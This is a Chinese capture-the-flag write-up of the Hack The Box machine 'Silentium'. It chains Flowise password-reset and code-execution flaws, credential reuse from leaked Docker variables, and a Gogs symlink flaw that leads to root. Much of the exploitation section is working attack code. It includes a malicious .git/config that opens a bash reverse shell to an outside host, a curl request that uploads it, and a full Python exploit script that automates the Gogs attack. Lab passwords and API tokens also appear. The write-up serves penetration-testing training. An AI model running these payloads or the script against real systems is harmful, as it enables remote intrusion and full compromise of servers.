# HTB Season10 Silentium

## 信息收集

### 端口扫描

```bash
nmap -p- --min-rate 5000 -T4 10.129.124.216
```

<img src="img/port.png" alt="port">

```bash
nmap -sCV -O -p22,80 --min-rate 5000 -T4 10.129.124.216
```

<img src="img/services.png">

### 子域名枚举

```bash
wfuzz -c -w '/root/Desktop/wordlists/amass/subdomains-top1mil-5000.txt' -u http://silentium.htb -H "Host:FUZZ.silentium.htb" --hc 301
```


<img src="img/subdomain.png">



### 目录扫描

- **主站**
```bash
dirsearch -u http://silentium.htb/
 ```

<img src="img/main_web.png">

- **staging**
    ```bash
    dirsearch -u http://staging.silentium.htb
    ```
    - **version**
    `/api/version`

<img src="img/version.png">    

## 服务组件漏洞

### CVE-2023-58434 + CVE-2023-59528

- **漏洞细节**
    - **漏洞描述**
      - **CVE-2025-58434 — Unauthenticated Account Takeover**
        The forgot-password endpoint returns a valid password reset token in the API response without requiring authentication. An attacker with knowledge of a valid email address can reset any account's password without user interaction.
        忘记密码端点在 API 响应中返回一个有效的密码重置令牌，无需身份验证。攻击者只要知道有效电子邮件地址，就可以在不需用户操作的情况下重置任何账户的密码。
      - **CVE-2025-59528 — Authenticated Remote Code Execution**
        The CustomMCP node passes user-controlled input directly to a Function() constructor with full Node.js privileges. An authenticated user with a valid API key can execute arbitrary OS commands as the Flowise process user.
        CustomMCP 节点将用户控制的输入直接传递给具有完整 Node.js 权限的 Function（） 构造器。拥有有效 API 密钥的认证用户可以作为 Flowise 进程用户执行任意操作系统命令。
    - **Fixed in: Flowise 3.0.6**
    - **漏洞影响**
        Exploit chain for two vulnerabilities affecting Flowise <= 3.0.5。

### 邮箱枚举
发现user可以枚举

<img src="img/sign.png">

在主站发现领导团队

`Marcus Thorne`,`Ben`,`Elena Rossi`

<img src="img/leader.png">

枚举得到`ben@silentium.htb`

<img src="img/ben.png">

## 漏洞利用

### exp
参考链接
`https://github.com/AzureADTrent/CVE-2025-58434-59528`

#### 重置密码

```bash
python3 flowise_chain.py -t http://staging.silentium.htb -e ben@silentium.htb
```

password: `Pwn3d!2026`
登录后访问`/apikey`获取apiKey
apiKey: `hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc`

<img src="img/exp.png">

上线为`root`，但为docker容器环境，需要逃逸容器

<img src="img/docker.png">

## ben

docker容器的env泄露密码`F1l3_d0ck3r`和`r04D!!_R4ge`

<img src="img/env.png">

进行fuzz发现`r04D!!_R4ge`可以ssh登录`ben`

<img src="img/fuzz.png">

## 3001 port

linpeas.sh发现多个内部端口

<img src="img/linpeas.png">

```bash
curl http://127.0.0.1:3001/
```

curl发现为http站点

<img src="img/curl.png">

通过ssh搭建隧道访问`3001`端口

```bash
ssh -L 3001:127.0.0.1:3001 ben@silentium.htb
```

该端口为gogs服务

<img src="img/3001.png">

gogs是以`root`用户运行

<img src="img/gogs.png">

```bash
cd /opt/gogs/gogs
./gogs --version
```

版本为`v0.13.3`

<img src="img/gogs_v.png">

配置文件为`/opt/gogs/gogs/custom/app.ini`

进一步印证以`root`用户运行gogs

<img src="img/conf.png">

###  组件漏洞

- **gogs(CVE-2025-64111)远程命令执行**
  - **漏洞描述**
    因`UpdateRepoFile`函数的.git 路径校验覆盖不全、`isRepositoryGitPath`校验函数的设计缺陷，导致攻击者可通过符号链接路径映射或直接操控原始路径的方式绕过防护，篡改仓库`.git/config`文件并注入恶意`core.sshCommand`参数，最终在 Git 执行 SSH 相关操作时触发服务器端命令执行。
  - **漏洞影响**
    该漏洞存在于 Gogs ≤0.13.3 版本。
  - **漏洞利用**
    1. 本地创建仓库推送README.md文件
      ```bash
      touch README.md
      git init
      git add README.md
      git config --global user.email zhaha@123.com
      git commit -m "first commit"
      git remote add origin http://127.0.0.1:3001/zhaha/root.git
      git push -u origin master
      ```
    2. 创建一个符号链接指向.git/config文件
      ```bash
      ln -s .git/config innocent.txt
      git add innocent.txt
      git commit -m "oops"
      git push -u origin master
      ```

      上传innocent.txt文件后,发现`.git/config`文件被同步至innocent.txt文件
      <img src="img/config.png">

    3. 获取APIKey
      <img src="img/ln.png">
    3. 获取APIKey
      <img src="img/apikey.png">
    4. 构造恶意.git/config文件,注入恶意`core.sshCommand`参数
      ```bash
      [core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
        ignorecase = true
        precomposeunicode = true
        sshCommand = bash -c 'bash -i >& /dev/tcp/10.10.16.7/4444 0>&1' #
      [remote "origin"]
        url = http://127.0.0.1:3001/zhaha/root.git
        fetch = +refs/heads/*:refs/remotes/origin/*
      [branch "master"]
        remote = origin
        merge = refs/heads/master
      ```
    5. 将恶意.git/config文件编码为base64,并使用`Gogs API`put至gogs仓库,会自动执行`sshCommand`参数
      ```bash
      curl -k --request PUT \
      --url "http://127.0.0.1:3001/api/v1/repos/zhaha/root/contents/innocent.txt" \
      --header "Authorization: token ae9bb7f4fdc593f4b9b09b9ee2ab6a59ab58f8cd" \
      --header "Content-Type: application/json" \
      --header "Cookie: i_like_gogs=1e956f58358cb4ca" \
      --data '{
        "message": "update_code",
        "content": "W2NvcmVdCglyZXBvc2l0b3J5Zm9ybWF0dmVyc2lvbiA9IDAKCWZpbGVtb2RlID0gdHJ1ZQoJYmFyZSA9IGZhbHNlCglsb2dhbGxyZWZ1cGRhdGVzID0gdHJ1ZQoJaWdub3JlY2FzZSA9IHRydWUKCXByZWNvbXBvc2V1bmljb2RlID0gdHJ1ZQogIHNzaENvbW1hbmQgPSBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjcvNDQ0NCAwPiYxJyAjCltyZW1vdGUgIm9yaWdpbiJdCgl1cmwgPSBodHRwOi8vMTI3LjAuMC4xOjMwMDEvemhhaGEvcm9vdC5naXQKCWZldGNoID0gK3JlZnMvaGVhZHMvKjpyZWZzL3JlbW90ZXMvb3JpZ2luLyoKW2JyYW5jaCAibWFzdGVyIl0KCXJlbW90ZSA9IG9yaWdpbgoJbWVyZ2UgPSByZWZzL2hlYWRzL21hc3Rlcgo="
      }'

      ```

#### poc

poc经过修改,参考链接`https://github.com/zAbuQasem/gogs-CVE-2025-8110`

```bash
#!/usr/bin/env python3

import argparse
import requests
import os
import subprocess
import shutil
import urllib3
from urllib.parse import urlparse
import base64
from bs4 import BeautifulSoup
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

"""Exploit script for CVE-2025-8110 in Gogs."""

__author__ = "zAbuQasem"
__Linkedin__ = "https://www.linkedin.com/in/zeyad-abulaban/"



def register(session, base_url, username, password):
    """Register a new user."""
    register_url = f"{base_url}/user/sign_up"
    resp = session.get(register_url)  # Get CSRF token from form

    csrf = extract_csrf(resp.text)

    register_data = {
        "_csrf": csrf,
        "user_name": username,
        "email": "wy@123.com",  # ！！！！！ change it !
        "password": password,
        "retype": password,
    }
    resp = session.post(
        register_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=register_data,
        allow_redirects=True,
    )
    if "Username has already been taken." in resp.text:
        pass  # User already exists, continue
    elif "notexist" in resp.url:
        console.print(f"[bold red]Registration failed: {resp.status_code}[/bold red]")
        raise ValueError("Registration failed")
    console.print("[bold green][+] Registered successfully[/bold green]")
    return session.cookies


def login(session, base_url, username, password):
    """Authenticate and retrieve CSRF token + session cookie."""
    login_url = f"{base_url}/user/login"
    resp = session.get(login_url)  # Get CSRF token from form

    csrf = extract_csrf(resp.text)

    login_data = {
        "_csrf": csrf,
        "user_name": username,
        "password": password,
    }
    resp = session.post(
        login_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=login_data,
        allow_redirects=True,
    )
    if "user/login" in resp.url:
        console.print(f"[bold red]Authentication failed: {resp.status_code}[/bold red]")
        raise ValueError("Authentication failed")
    console.print("[bold green][+] Authenticated successfully[/bold green]")
    return session.cookies


def get_application_token(session, base_url):
    """Retrieve application token from settings."""
    settings_url = f"{base_url}/user/settings/applications"
    # First GET to fetch the page (and CSRF hidden field) before POSTing
    get_resp = session.get(settings_url, allow_redirects=True)
    csrf = extract_csrf(get_resp.text)

    data = {"_csrf": csrf, "name": os.urandom(8).hex()}
    resp = session.post(settings_url, data=data, allow_redirects=True)
    console.print(f"[blue]Token generation status: {resp.status_code}[/blue]")
    soup = BeautifulSoup(resp.text, "html.parser")
    token_div = soup.find("div", class_="ui info message")
    if not token_div:
        raise ValueError("Application token not found")
    token = token_div.find("p").text.strip()
    console.print(f"[bold green][+] Application token: {token}[/bold green]")
    return token


def create_malicious_repo(session, base_url, token):
    """Create a repository with a malicious payload."""
    api = f"{base_url}/api/v1/user/repos"
    repository_name = os.urandom(6).hex()
    data = {
        "name": repository_name,
        "description": "Malicious repo for CVE-2025-8110",
        "auto_init": True,
        "readme": "Default",
        "ssh": True,
    }
    session.headers.update({"Authorization": f"token {token}"})
    resp = session.post(api, json=data)
    console.print(f"[blue]Repo creation status: {resp.status_code}[/blue]")
    return repository_name


def upload_malicious_symlink(base_url, username, password, repo_name):
    """Clone a repo, add a symlink, commit, and push it."""
    repo_dir = f"/tmp/{repo_name}"

    parsed_url = urlparse(base_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        raise ValueError("Base URL must include scheme (e.g., http://host)")
    base_path = parsed_url.path.rstrip("/")

    clone_cmd = [
        "git",
        "clone",
        f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}"
        f"{base_path}/{username}/{repo_name}.git",
        repo_dir,
    ]

    symlink_path = os.path.join(repo_dir, "malicious_link")

    try:
        # Clean up if directory already exists
        if os.path.exists(repo_dir):
            shutil.rmtree(repo_dir)

        # Clone repository
        subprocess.run(clone_cmd, check=True)

        # Create symlink inside the repo
        os.symlink(".git/config", symlink_path)

        # Add, commit, and push
        subprocess.run(
            ["git", "add", "malicious_link"],
            cwd=repo_dir,
            check=True,
        )

        subprocess.run(
            ["git", "commit", "-m", "Add malicious symlink"],
            cwd=repo_dir,
            check=True,
        )

        subprocess.run(
            ["git", "push", "origin", "master"],
            cwd=repo_dir,
            check=True,
        )

    except subprocess.CalledProcessError as e:
        raise ValueError(f"Git command failed: {e}") from e
    except OSError as e:
        raise ValueError(f"Filesystem operation failed: {e}") from e


def exploit(session, base_url, token, username, repo_name, command):
    """Exploit CVE-2025-8110 to execute arbitrary commands."""
    api = f"{base_url}/api/v1/repos/{username}/{repo_name}/contents/malicious_link"
    data = {
        "message": "Exploit CVE-2025-8110",
        "content": base64.b64encode(command.encode()).decode(),
    }
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
    }
    console.print("[bold green][+] Exploit sent, check your listener![/bold green]")
    session.put(api, json=data, headers=headers, timeout=5)


def extract_csrf(html_text):
    """Parse CSRF token from hidden input; fallback to cookie if present."""
    soup = BeautifulSoup(html_text, "html.parser")
    token_input = soup.select_one("input[name=_csrf]")
    if token_input and token_input.get("value"):
        return token_input.get("value")
    raise ValueError("CSRF token not found in form response")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Gogs base URL")
    parser.add_argument("-lh", "--host", required=True, help="Attacker host")
    parser.add_argument("-lp", "--port", required=True, help="Attacker port")
    parser.add_argument("-x", "--proxy", action="store_true", help="Use proxy")
    args = parser.parse_args()
    session = requests.Session()
    username = "pwnuser" # ！！！！！ change it !
    password = "123456" # ！！！！！ change it !
    command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"
    try:
        register(session, args.url, username, password)
        login(session, args.url, username, password)
        token = get_application_token(session, args.url)
        repo_name = create_malicious_repo(session, args.url, token)
        git_config = f"""[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
  sshCommand = {command}
[remote "origin"]
	url = git@localhost:gogs/{repo_name}.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
"""
        upload_malicious_symlink(args.url, username, password, repo_name)
        exploit(session, args.url, token, username, repo_name, git_config)

    except Exception as e:
        console.print(f"[bold red][-] Error: {e}[/bold red]")


if __name__ == "__main__":
    main()
```

  
